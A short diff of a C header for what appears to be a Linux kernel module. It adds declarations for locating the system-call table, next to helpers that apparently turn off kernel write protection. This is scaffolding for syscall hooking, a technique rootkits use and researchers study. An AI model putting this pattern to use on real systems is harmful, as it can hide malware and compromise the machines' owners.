@@ -2,6 +2,7 @@
 #define HOOKING_H
 
 #include <asm/processor-flags.h>
+#include <asm/syscall.h>
 #include "sysmap.h"
 
 static inline void disable_wp(void){
@@ -13,5 +14,9 @@ static inline void enable_wp(void){
 }
 
 static void ** syscall_table = (void * *) sys_call_table_R;
+static void ** _sys_call_table = NULL;
+
+void find_syscall_table(void);
+
 
 #endif
